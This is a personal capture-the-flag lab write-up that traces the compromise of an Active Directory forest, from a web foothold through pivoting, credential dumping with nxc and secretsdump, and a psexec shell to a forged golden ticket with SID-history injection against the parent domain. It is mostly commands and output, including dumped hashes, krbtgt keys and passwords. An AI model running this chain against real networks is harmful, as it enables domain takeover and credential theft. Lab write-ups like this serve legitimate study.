---
created: 2026-03-13
modified: 2026-03-13
---

Honestly i did not want to write a write up for this lab.. bu half way down i think i'm supposed to write one..

External network

 1 host -> 192.168.80.10

22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8d:c3:a7:a5:bf:16:51:f2:03:85:a7:37:ee:ae:8d:81 (RSA)
|   256 9a:b2:73:5a:e5:36:b4:91:d8:8c:f7:4a:d0:15:65:28 (ECDSA)
|_  256 3c:16:a7:6a:b6:33:c5:83:ab:7f:99:60:6a:4c:09:11 (ED25519)
80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Cyber WareFare Labs
|_http-server-header: Apache/2.4.41 (Ubuntu)
1234/tcp open  tcpwrapped


RCE at email field for news letter subscription.


found some mysql credentials in web files.

$host = "localhost";  
        $user = "root";  
        password = 'Web!@#%';  
        $db_name = "pro"

nothing intresting in the database.

cat /etc/hosts | grep 'sh$'

root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:ubuntu,,,:/home/ubuntu:/bin/bash
privilege:x:1001:1001:Admin@962:/home/privilege:/bin/bash

we get the password for the user privilege..

privilege : Admin@962 -> login using ssh. 

Network pivoting -> used ligolo-ng but the latest version was not working so i used 0.4.2 version. 

Using nmap -sn 192.168.98.0/24 gave me all 256 hosts as up..

using nxc i got this -> it resolves the IPs to the netbiosname and the domain the host belong in which i a very good thing.

internal network scan 

```bash
nxc smb 192.168.98.0/24                                                               
SMB         192.168.98.2    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:warfare.corp) (signing:True) (SMBv1:False)
SMB         192.168.98.30   445    MGMT             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MGMT) (domain:child.warfare.corp) (signing:False) (SMBv1:False)
SMB         192.168.98.120  445    CDC              [*] Windows 10 / Server 2019 Build 17763 x64 (name:CDC) (domain:child.warfare.corp) (signing:True) (SMBv1:False)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

we have three hosts one in the parent domain and two in the child domain.. in the child domain we have the CDC which i suspect is the child domain controller and also we have another host MGMT.


add the host to /etc/hosts file 

```bash
192.168.98.2    dc01.warfare.corp   warfare.corp
192.168.98.120  cdc.child.warfare.corp   child.warfare.corp
192.168.98.30   mgmt.child.warfare.corp
```

> [!NOTE]
> You shouldn’t map `child.warfare.corp` to the MGMT host because `child.warfare.corp` represents the entire child domain (the DNS zone), and by design in Active Directory it should resolve to the child domain controller (CDC). If you instead point the domain name to MGMT, tools like `kinit`, `ldapsearch`, or `smbclient -L child.warfare.corp` will mistakenly try to treat MGMT as the domain controller, which will break Kerberos authentication, LDAP queries, and other domain trust operations. The presence of port 88 may indicte the host is the domain controller in most cases.


Guest account is diabled in all hosts 

```bash
nxc smb internalhosts.txt -u 'guest' -p ''
SMB         192.168.98.2    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:warfare.corp) (signing:True) (SMBv1:False)
SMB         192.168.98.120  445    CDC              [*] Windows 10 / Server 2019 Build 17763 x64 (name:CDC) (domain:child.warfare.corp) (signing:True) (SMBv1:False)
SMB         192.168.98.30   445    MGMT             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MGMT) (domain:child.warfare.corp) (signing:False) (SMBv1:False)
SMB         192.168.98.2    445    DC01             [-] warfare.corp\guest: STATUS_ACCOUNT_DISABLED 
SMB         192.168.98.120  445    CDC              [-] child.warfare.corp\guest: STATUS_ACCOUNT_DISABLED 
SMB         192.168.98.30   445    MGMT             [-] child.warfare.corp\guest: STATUS_ACCOUNT_DISABLED 
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

And our user is not a valid user in the hosts.

```bash
 nxc smb internalhosts.txt -u 'privilege' -p 'Admin@962'
SMB         192.168.98.2    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:warfare.corp) (signing:True) (SMBv1:False)
SMB         192.168.98.120  445    CDC              [*] Windows 10 / Server 2019 Build 17763 x64 (name:CDC) (domain:child.warfare.corp) (signing:True) (SMBv1:False)
SMB         192.168.98.30   445    MGMT             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MGMT) (domain:child.warfare.corp) (signing:False) (SMBv1:False)
SMB         192.168.98.2    445    DC01             [-] warfare.corp\privilege:Admin@962 STATUS_LOGON_FAILURE 
SMB         192.168.98.120  445    CDC              [-] child.warfare.corp\privilege:Admin@962 STATUS_LOGON_FAILURE 
SMB         192.168.98.30   445    MGMT             [-] child.warfare.corp\privilege:Admin@962 STATUS_LOGON_FAILURE 
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

using kerbrute i found one potential user in the child domain.

```bash
kerbrute userenum -d child.warfare.corp --dc 192.168.98.120 /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 09/03/25 - Ronnie Flathers @ropnop

2025/09/03 12:02:10 >  Using KDC(s):
2025/09/03 12:02:10 >  	192.168.98.120:88

2025/09/03 12:02:13 >  [+] VALID USERNAME:	 john@child.warfare.corp
2025/09/03 12:03:06 >  [+] VALID USERNAME:	 John@child.warfare.corp
```

but i dont have any valid user creds

```bash
nxc smb internalhosts.txt -u 'john' -p 'Admin@962'
SMB         192.168.98.30   445    MGMT             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MGMT) (domain:child.warfare.corp) (signing:False) (SMBv1:False)
SMB         192.168.98.2    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:warfare.corp) (signing:True) (SMBv1:False)
SMB         192.168.98.120  445    CDC              [*] Windows 10 / Server 2019 Build 17763 x64 (name:CDC) (domain:child.warfare.corp) (signing:True) (SMBv1:False)
SMB         192.168.98.30   445    MGMT             [-] child.warfare.corp\john:Admin@962 STATUS_LOGON_FAILURE 
SMB         192.168.98.2    445    DC01             [-] warfare.corp\john:Admin@962 STATUS_LOGON_FAILURE 
SMB         192.168.98.120  445    CDC              [-] child.warfare.corp\john:Admin@962 STATUS_LOGON_FAILURE 
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
                                                                                                                                        
┌──(darklight㉿jinx)-[~/Documents/ctf/cwl]
└─$ nxc smb internalhosts.txt -u 'john' -p 'john'     
SMB         192.168.98.2    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:warfare.corp) (signing:True) (SMBv1:False)
SMB         192.168.98.120  445    CDC              [*] Windows 10 / Server 2019 Build 17763 x64 (name:CDC) (domain:child.warfare.corp) (signing:True) (SMBv1:False)
SMB         192.168.98.30   445    MGMT             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MGMT) (domain:child.warfare.corp) (signing:False) (SMBv1:False)
SMB         192.168.98.2    445    DC01             [-] warfare.corp\john:john STATUS_LOGON_FAILURE 
SMB         192.168.98.120  445    CDC              [-] child.warfare.corp\john:john STATUS_LOGON_FAILURE 
SMB         192.168.98.30   445    MGMT             [-] child.warfare.corp\john:john STATUS_LOGON_FAILURE 
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

There is another set of credentials at 
```bash
privilege@ubuntu-virtual-machine:~/.mozilla/firefox/b2rri1qd.default-release$ sqlite3 places.sqlite .dump
```

```bash
INSERT INTO moz_bookmarks VALUES(18,1,16,5,0,'http://192.168.98.30/admin/index.php?user=john@child.warfare.corp&pass=User1@#$%6',NULL,NULL,1737028407427000,1737029666390000,'tuXr2pTr03P2',1,7);
```

john : User1@#$%6

```bash
nxc smb internalhosts.txt -u 'john' -p 'User1@#$%6'
SMB         192.168.98.2    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:warfare.corp) (signing:True) (SMBv1:False)
SMB         192.168.98.30   445    MGMT             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MGMT) (domain:child.warfare.corp) (signing:False) (SMBv1:False)
SMB         192.168.98.120  445    CDC              [*] Windows 10 / Server 2019 Build 17763 x64 (name:CDC) (domain:child.warfare.corp) (signing:True) (SMBv1:False)
SMB         192.168.98.2    445    DC01             [-] warfare.corp\john:User1@#$%6 STATUS_LOGON_FAILURE 
SMB         192.168.98.30   445    MGMT             [+] child.warfare.corp\john:User1@#$%6 (Pwn3d!)
SMB         192.168.98.120  445    CDC              [+] child.warfare.corp\john:User1@#$%6 
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

John can login in the two hosts in the child domain but the he is an administrator in MGMT host (Pwn3d). 


User enumeration in the child domain 

```bash
nxc smb 192.168.98.30 -u 'john' -p 'User1@#$%6' --users
SMB         192.168.98.30   445    MGMT             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MGMT) (domain:child.warfare.corp) (signing:False) (SMBv1:False)
SMB         192.168.98.30   445    MGMT             [+] child.warfare.corp\john:User1@#$%6 (Pwn3d!)
SMB         192.168.98.30   445    MGMT             -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         192.168.98.30   445    MGMT             Administrator                 2025-01-15 14:05:55 0       Built-in account for administering the computer/domain
SMB         192.168.98.30   445    MGMT             DefaultAccount                <never>             0       A user account managed by the system.
SMB         192.168.98.30   445    MGMT             Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         192.168.98.30   445    MGMT             WDAGUtilityAccount            2024-12-27 15:53:25 0       A user account managed and used by the system for Windows Defender Application Guard scenarios.
SMB         192.168.98.30   445    MGMT             [*] Enumerated 4 local users: MGMT
                                                                                                                       
┌──(darklight㉿jinx)-[~/Documents/ctf/cwl]
└─$ nxc smb 192.168.98.120 -u 'john' -p 'User1@#$%6' --users
SMB         192.168.98.120  445    CDC              [*] Windows 10 / Server 2019 Build 17763 x64 (name:CDC) (domain:child.warfare.corp) (signing:True) (SMBv1:False)
SMB         192.168.98.120  445    CDC              [+] child.warfare.corp\john:User1@#$%6 
SMB         192.168.98.120  445    CDC              -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         192.168.98.120  445    CDC              Administrator                 2025-01-17 14:17:03 0       Built-in account for administering the computer/domain
SMB         192.168.98.120  445    CDC              Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         192.168.98.120  445    CDC              krbtgt                        2025-01-17 14:30:52 0       Key Distribution Center Service Account
SMB         192.168.98.120  445    CDC              john                          2025-01-17 14:44:15 0        
SMB         192.168.98.120  445    CDC              corpmngr                      2025-01-17 14:45:06 0        
SMB         192.168.98.120  445    CDC              [*] Enumerated 5 local users: CHILD
```

Our key target is the domain cotroller in the child domian. 

SInce john is and administrator in MGMT we can dump lsa secrets.

```bash
nxc smb 192.168.98.30 -u 'john' -p 'User1@#$%6' --lsa   
SMB         192.168.98.30   445    MGMT             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MGMT) (domain:child.warfare.corp) (signing:False) (SMBv1:False)
SMB         192.168.98.30   445    MGMT             [+] child.warfare.corp\john:User1@#$%6 (Pwn3d!)
SMB         192.168.98.30   445    MGMT             [+] Dumping LSA secrets
SMB         192.168.98.30   445    MGMT             CHILD.WARFARE.CORP/john:$DCC2$10240#john#9855312d42ee254a7334845613120e61: (2025-01-17 14:47:56)
SMB         192.168.98.30   445    MGMT             CHILD.WARFARE.CORP/corpmngr:$DCC2$10240#corpmngr#7fd50bbab99e8ea7ae9c1899f6dea7c6: (2025-01-19 15:21:56)
SMB         192.168.98.30   445    MGMT             CHILD\MGMT$:aes256-cts-hmac-sha1-96:344c70047ade222c4ab35694d4e3e36de556692f02ec32fa54d3160f36246eec
SMB         192.168.98.30   445    MGMT             CHILD\MGMT$:aes128-cts-hmac-sha1-96:aa5b3d84614911fe611eafbda613baaf
SMB         192.168.98.30   445    MGMT             CHILD\MGMT$:des-cbc-md5:6402e0c20b89d386
SMB         192.168.98.30   445    MGMT             CHILD\MGMT$:plain_password_hex:4f005d003b006f0074005d003500760067002f0032007a0046004e0020004d00700023003600570031005000770041002600700055003d005a0047006100370033003e003b0032004600410059002a006b0046004400410069003e00530066006a0033006e0061007a004e0060003300590063005e0048006c005c0053003e003e0033003c007300500043007a002500300031004b00610060002000540033007a003f004200580048002f0068006d0052006f0027005b00520061003b003a0075002b0050004a005d006b003c006d004c00730045005d005b0074006c004b00760045005c00280059003a0066002000
SMB         192.168.98.30   445    MGMT             CHILD\MGMT$:aad3b435b51404eeaad3b435b51404ee:0f5fe480dd7eaf1d59a401a4f268b563:::
SMB         192.168.98.30   445    MGMT             dpapi_machinekey:0x34e3cc87e11d51028ffb38c60b0afe35d197627d
dpapi_userkey:0xb890e07ba0d31e31c758d305c2a29e1b4ea813a5
SMB         192.168.98.30   445    MGMT             "corpmngr@child.warfare.corp:User4&*&*"
SMB         192.168.98.30   445    MGMT             [+] Dumped 9 LSA secrets to /home/darklight/.nxc/logs/lsa/MGMT_192.168.98.30_2025-09-03_124352.secrets and /home/darklight/.nxc/logs/lsa/MGMT_192.168.98.30_2025-09-03_124352.cached
```

we obtained clear text credentials for `corpmngr` seems like a short form for `corparate manager` anyway lets test ther creds.

```bash
 nxc smb internalhosts.txt -u 'corpmngr' -p 'User4&*&*'
SMB         192.168.98.30   445    MGMT             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MGMT) (domain:child.warfare.corp) (signing:False) (SMBv1:False)
SMB         192.168.98.2    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:warfare.corp) (signing:True) (SMBv1:False)
SMB         192.168.98.120  445    CDC              [*] Windows 10 / Server 2019 Build 17763 x64 (name:CDC) (domain:child.warfare.corp) (signing:True) (SMBv1:False)
SMB         192.168.98.30   445    MGMT             [+] child.warfare.corp\corpmngr:User4&*&* 
SMB         192.168.98.2    445    DC01             [-] warfare.corp\corpmngr:User4&*&* STATUS_LOGON_FAILURE
SMB         192.168.98.120  445    CDC              [+] child.warfare.corp\corpmngr:User4&*&* (Pwn3d!)
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

we still dont have access to the parent domain but we have full control on the on the domain controller in the child domain.


```bash
bloodhound-ce-python -u 'corpmngr' -p 'User4&*&*' -d child.warfare.corp -ns 192.168.98.120 -c All --zip --dns-timeout 60
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: child.warfare.corp
WARNING: Could not find a global catalog server, assuming the primary DC has this role
If this gives errors, either specify a hostname with -gc or disable gc resolution with --disable-autogc
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: cdc.child.warfare.corp
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: cdc.child.warfare.corp
INFO: Connecting to GC LDAP server: cdc.child.warfare.corp
INFO: Found 6 users
INFO: Found 47 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 21 containers
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: mgmt.child.warfare.corp
INFO: Querying computer: cdc.child.warfare.corp
INFO: User Administrator is logged in on cdc.child.warfare.corp from 192.168.98.15
INFO: User Administrator is logged in on cdc.child.warfare.corp from 192.168.98.15
INFO: User Administrator is logged in on cdc.child.warfare.corp from 192.168.98.15
INFO: User Administrator is logged in on cdc.child.warfare.corp from 192.168.98.15
WARNING: DNS lookup failed: 15.98.168.192.in-addr.arpa.
WARNING: Could not resolve hostname to SID: 192.168.98.15
WARNING: Could not resolve hostname to SID: 192.168.98.15
WARNING: Could not resolve hostname to SID: 192.168.98.15
WARNING: Could not resolve hostname to SID: 192.168.98.15
INFO: Done in 02M 02S
INFO: Compressing output into 20250903211046_bloodhound.zip
```

![[Pasted_image_20250903212418.png]]

Since we have administrative rights in the child domain's DC we can use `impacket-psexec` to get a interactive shell with the DC and enumarate trusts.

```bash
impacket-psexec child.warfare.corp/corpmngr:'User4&*&*'@cdc.child.warfare.corp -dc-ip 192.168.98.120
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on cdc.child.warfare.corp.....
[*] Found writable share ADMIN$
[*] Uploading file XbJslhYY.exe
[*] Opening SVCManager on cdc.child.warfare.corp.....
[*] Creating service xELn on cdc.child.warfare.corp.....
[*] Starting service xELn.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.



PS C:\Windows\system32> 
PS C:\Windows\system32> 
Get-ADTrust      

PS C:\Windows\system32> Get-ADTrust

Get-ADTrust : Cannot validate argument on parameter 'Filter'. The argument is null or empty. Provide an argument that 
is not null or empty, and then try the command again.
At line:1 char:1
+ Get-ADTrust
+ ~~~~~~~~~~~
    + CategoryInfo          : InvalidData: (:) [Get-ADTrust], ParameterBindingValidationException
    + FullyQualifiedErrorId : ParameterArgumentValidationError,Microsoft.ActiveDirectory.Management.Commands.GetADTrus 
   t

 
Get-ADTrust -Filter *
PS C:\Windows\system32> Get-ADTrust -Filter *


Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=warfare.corp,CN=System,DC=child,DC=warfare,DC=corp
ForestTransitive        : False
IntraForest             : True
IsTreeParent            : False
IsTreeRoot              : False
Name                    : warfare.corp
ObjectClass             : trustedDomain
ObjectGUID              : 59bbc30c-d218-495f-a48c-b728a42eb732
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=child,DC=warfare,DC=corp
Target                  : warfare.corp
TGTDelegation           : False
TrustAttributes         : 32
TrustedPolicy           : 
TrustingPolicy          : 
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False

```

We have a bidirectional trust between the the child domain and parent domain which is always the case in `SameForestTrust` (Trusts within a forest.)

We can exploit this to gain administrative privileges in the parent domain through `SID history injection`

https://github.com/HackTricks-wiki/hacktricks/blob/master/src/windows-hardening/active-directory-methodology/sid-history-injection.md

kept having issues with the `impacket-raisechild`. The tool basically automates the process saving us time.

```bash
 faketime -f "-20m21s" \          
impacket-raiseChild child.warfare.corp/corpmngr:'User4&*&*' -target-exec 192.168.98.2 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Raising child domain child.warfare.corp
[*] Forest FQDN is: warfare.corp
[*] Raising child.warfare.corp to warfare.corp
[*] warfare.corp Enterprise Admin SID is: S-1-5-21-3375883379-808943238-3239386119-519
[*] Getting credentials for child.warfare.corp
child.warfare.corp/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e57dd34c1871b7a23fb17a77dec9b900:::
child.warfare.corp/krbtgt:aes256-cts-hmac-sha1-96s:ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2
[-] Kerberos SessionError: KDC_ERR_TGT_REVOKED(TGT has been revoked)
```

Guess we have to do this manually. First we need to identify the SIDs of the child domain and the parent domain.

```bash
impacket-lookupsid child.warfare.corp/corpmngr:'User4&*&*'@cdc.child.warfare.corp
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at cdc.child.warfare.corp
[*] StringBinding ncacn_np:cdc.child.warfare.corp[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-3754860944-83624914-1883974761
500: CHILD\Administrator (SidTypeUser)
501: CHILD\Guest (SidTypeUser)
502: CHILD\krbtgt (SidTypeUser)

[SNIP]

impacket-lookupsid child.warfare.corp/corpmngr:'User4&*&*'@cdc.child.warfare.corp -target-ip 192.168.98.2
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at cdc.child.warfare.corp
[*] StringBinding ncacn_np:cdc.child.warfare.corp[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-3375883379-808943238-3239386119
498: WARFARE\Enterprise Read-only Domain Controllers (SidTypeGroup)
[SNIP]
```

`warfare.corp Domain SID (Parent Domain) : S-1-5-21-3375883379-808943238-3239386119
`child.warfare.corp (child domain) SID :  S-1-5-21-3754860944-83624914-1883974761`

Then since we want to add our taget to a privilege group, in most cases we add our self in the `Enterprise Admins` group whose RID is **`519`** To contruct the whole SID for the enterprise domain we combine the domain SID and the group RID (domain SID + group RID)

enterprise SID in the parent domain :  S-1-5-21-3375883379-808943238-3239386119-519

Next we need the NT Hash or AES key for `krbtgt` account in the child domain. Since we have administrative privileges in the child domain's DC we can use secretsdump to dump the creds or we can use nxc

```bash
impacket-secretsdump child.warfare.corp/corpmngr:'User4&*&*'@cdc.child.warfare.corp
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x1f708e4acbad10bdca483cab9456da02
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:baed2348444e297172df065ca8c92c5d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
CHILD\CDC$:aes256-cts-hmac-sha1-96:13c7c344c78985a1df3b060c32f46400c9a1deb95d59df83ecd6bafb99b03dd3
CHILD\CDC$:aes128-cts-hmac-sha1-96:c8a5b8a11f1be852be17b7afb907c864
CHILD\CDC$:des-cbc-md5:bf37bc948a458325
CHILD\CDC$:plain_password_hex:30b39b1a2c9691f91a84fd37f6cc46f8be1fefcce7c0f26cc8a4da9f64746220fee2c1c520fa2512ca9143de8f6d19931703d9f4baf062488429e3d896ea47fde25def7b930ea788e369a7c061ab080167556d4817f36f8c9741b9d77e79d6abb1bf2bff7fe070d53c55feee15fce34f2a90fe6f009afa3c0d11b36c63b7a68e4b6b5524333ccdf167da352fe97795df4c4018efef3859d828ee769a8bd31531ceb1607f97cd2024edf51004e98c064de4cc1eddd91a748b6f12270149364fd1eb9ed079b582c1ad305f68c0c4935833205cf38d978fad362f681c57bb382b51c3d12507363290c32d30c2f856b18d9e
CHILD\CDC$:aad3b435b51404eeaad3b435b51404ee:51695af785147680bc44fcbf009bc3aa:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xf9e5cb0452350da239e70d692e67a5cc857a8dfd
dpapi_userkey:0xf349f2325f7dbc9b6817f715c717c000d630d206
[*] NL$KM 
 0000   DF 88 5A CF A1 68 07 4C  C8 4D E0 93 AF 76 09 3E   ..Z..h.L.M...v.>
 0010   72 6C D0 92 E9 EF 9C 72  D6 FE 59 C6 CB B7 03 82   rl.....r..Y.....
 0020   D8 96 C9 56 9B 67 DC DA  C8 71 DD 77 B9 69 16 C8   ...V.g...q.w.i..
 0030   C1 18 7D 40 C1 18 47 4C  48 1D DF 62 A7 C0 46 82   ..}@..GLH..b..F.
NL$KM:df885acfa168074cc84de093af76093e726cd092e9ef9c72d6fe59c6cbb70382d896c9569b67dcdac871dd77b96916c8c1187d40c118474c481ddf62a7c04682
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8a8124cbf8513e07f1eeb0026c4d9de2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e57dd34c1871b7a23fb17a77dec9b900:::
child.warfare.corp\john:1104:aad3b435b51404eeaad3b435b51404ee:b6f7e9a9a92eaa9ecffb698657dfab36:::
child.warfare.corp\corpmngr:1106:aad3b435b51404eeaad3b435b51404ee:4cb3933610b827a281ec479031128cc6:::
CDC$:1000:aad3b435b51404eeaad3b435b51404ee:51695af785147680bc44fcbf009bc3aa:::
MGMT$:1107:aad3b435b51404eeaad3b435b51404ee:0f5fe480dd7eaf1d59a401a4f268b563:::
WARFARE$:1103:aad3b435b51404eeaad3b435b51404ee:82a9719f6d27cb0812a87d80d7893ebe:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2
krbtgt:aes128-cts-hmac-sha1-96:806d6ea798a9626d3ad00516dd6968b5
krbtgt:des-cbc-md5:ba0b49b6b6455885
child.warfare.corp\john:aes256-cts-hmac-sha1-96:18f8c46797a20dcc386c801fc343dfb2a93789e2826f8c2508adbd2a4d6dbc4c
child.warfare.corp\john:aes128-cts-hmac-sha1-96:a25860dff7e2ee7ac2924aa30be48c03
child.warfare.corp\john:des-cbc-md5:9d7657c8983d893e
child.warfare.corp\corpmngr:aes256-cts-hmac-sha1-96:080d9cbb6548a9f91feaaefd9dce9cd4ce1147edf8bdb275ae826679750c58aa
child.warfare.corp\corpmngr:aes128-cts-hmac-sha1-96:e3963f5140c0c6241bef30d054503f11
child.warfare.corp\corpmngr:des-cbc-md5:64c1d5df0bd9c767
CDC$:aes256-cts-hmac-sha1-96:13c7c344c78985a1df3b060c32f46400c9a1deb95d59df83ecd6bafb99b03dd3
CDC$:aes128-cts-hmac-sha1-96:c8a5b8a11f1be852be17b7afb907c864
CDC$:des-cbc-md5:04c1dac2851abf94
MGMT$:aes256-cts-hmac-sha1-96:344c70047ade222c4ab35694d4e3e36de556692f02ec32fa54d3160f36246eec
MGMT$:aes128-cts-hmac-sha1-96:aa5b3d84614911fe611eafbda613baaf
MGMT$:des-cbc-md5:6402e0c20b89d386
WARFARE$:aes256-cts-hmac-sha1-96:8f7984d89e1d9ce1bf5ddace5fd6ecda682460a2bb11c8881915dabe84eeee85
WARFARE$:aes128-cts-hmac-sha1-96:f9e26b37d161948f27b6d9f387312132
WARFARE$:des-cbc-md5:0e98d9ef6143ba6d
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

`krbtgt NT hash : e57dd34c1871b7a23fb17a77dec9b900
`krbtgt AES-256 key : ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2`

with that we have everything we need.


```bash
─$ faketime -f "-20m21s" \          
impacket-ticketer corpmngr -aesKey ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2 -domain child.warfare.corp -domain-sid S-1-5-21-3754860944-83624914-1883974761 -extra-sid S-1-5-21-3375883379-808943238-3239386119-519 -dc-ip 192.168.98.120
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for child.warfare.corp/corpmngr
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving ticket in corpmngr.ccache
                                                                                  
┌──(darklight㉿jinx)-[~/Documents/ctf/cwl]
└─$ export KRB5CCNAME=corpmngr.ccache
                                                                                  
┌──(darklight㉿jinx)-[~/Documents/ctf/cwl]
└─$ faketime -f "-20m21s" \          
impacket-getST child.warfare.corp/corpmngr -k -no-pass -spn 'CIFS/dc01.warfare.corp'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting ST for user
Kerberos SessionError: KDC_ERR_TGT_REVOKED(TGT has been revoked)

```

in this example we were getting our ticket revoked .. took a while to notice it but then it clicked .. on the help menu of the ticketer it said:

`  -user-id USER_ID      user id for the user the ticket will be created for (default = 500)
`
the defaut SID being used is `500` for administrator but we are forging a ticket for `corpmngr` who has an id of `1106` so the ticket carries a PAC having incosistent data. 

[[Introduction#AD terminology]]

```bash
faketime -f "-20m21s" \                                                  
impacket-ticketer corpmngr -aesKey ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2 -domain child.warfare.corp -domain-sid S-1-5-21-3754860944-83624914-1883974761 -extra-sid S-1-5-21-3375883379-808943238-3239386119-519 -user-id 1106 -dc-ip 192.168.98.120
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for child.warfare.corp/corpmngr
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving ticket in corpmngr.ccache
                                                                                  
